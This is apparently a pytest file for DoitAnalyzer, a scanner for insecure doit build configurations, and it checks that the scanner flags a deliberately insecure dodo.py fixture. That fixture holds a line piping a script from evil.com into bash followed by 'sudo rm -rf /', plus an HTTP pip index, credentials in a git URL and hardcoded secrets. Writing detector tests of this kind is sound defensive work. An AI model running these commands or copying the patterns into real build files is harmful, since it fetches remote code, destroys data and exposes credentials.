"""Tests for DoitAnalyzer."""

from pathlib import Path

from devai.doit_analyzer import DoitAnalyzer, DoitFinding


INSECURE_DODO = """\
from doit.tools import run, sudo
import os

API_KEY = "hardcoded-secret-token-12345"

def task_deploy():
    token = os.environ["SECRET_TOKEN"]
    return {
        "actions": [
            "curl http://evil.com/install.sh | bash && sudo rm -rf /",
            run("pip install --index-url http://insecure.pypi.org/simple pkg", shell=True),
            sudo("systemctl restart app"),
            "git clone http://user:pass@github.com/org/repo.git",
        ],
        "ignore": True,
        "chdir": "../../etc",
        "verbosity": 0,
    }

def task_build():
    return {"actions": [run("make", shell=True)]}
"""

HARDENED_DODO = """\
from __future__ import annotations

import os

from doit.tools import run


def task_test():
    return {
        "actions": [run("pytest tests", shell=False)],
        "verbosity": 2,
    }


def task_deploy():
    token = os.environ.get("DEPLOY_TOKEN")
    if not token:
        raise RuntimeError("DEPLOY_TOKEN is required")
    return {
        "actions": [run("deploy-cli --token $DEPLOY_TOKEN", shell=False)],
        "verbosity": 2,
    }
"""

INSECURE_DOIT_CFG = """\
[GLOBAL]
verbosity = 0
password = supersecret123
"""


class TestDoitAnalyzer:
    def test_detects_insecure_dodo(self, tmp_path: Path):
        (tmp_path / "dodo.py").write_text(INSECURE_DODO, encoding="utf-8")
        analyzer = DoitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "dangerous_command" in kinds
        assert "sudo_usage" in kinds
        assert "ignore_task_failure" in kinds
        assert "shell_true" in kinds
        assert "env_forward_all" in kinds
        assert "insecure_pip_index" in kinds
        assert "chdir_outside" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_dodo_clean(self, tmp_path: Path):
        (tmp_path / "dodo.py").write_text(HARDENED_DODO, encoding="utf-8")
        analyzer = DoitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_detects_doit_cfg(self, tmp_path: Path):
        (tmp_path / "doit.cfg").write_text(INSECURE_DOIT_CFG, encoding="utf-8")
        analyzer = DoitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "doit.cfg" for f in findings)
        assert any(f.kind == "verbosity_zero" for f in findings)

    def test_detects_doit_tasks_package(self, tmp_path: Path):
        tasks_dir = tmp_path / "doit_tasks"
        tasks_dir.mkdir()
        (tasks_dir / "__init__.py").write_text(INSECURE_DODO, encoding="utf-8")
        analyzer = DoitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "doit_tasks/__init__.py" for f in findings)

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "dodo.py").write_text(INSECURE_DODO, encoding="utf-8")
        analyzer = DoitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "dodo.py"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "dodo.py").write_text(INSECURE_DODO, encoding="utf-8")
        analyzer = DoitAnalyzer(str(tmp_path))
        assert "Doit configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Doit analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_template(self):
        snippet = DoitAnalyzer(".").generate_hardened_template()
        assert "dodo" in snippet or "doit" in snippet
        assert "shell=False" in snippet

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = DoitAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_finding_dataclass(self):
        finding = DoitFinding(
            kind="test",
            severity="low",
            message="test message",
            path="dodo.py",
            lineno=1,
        )
        assert "test message" in finding.format()
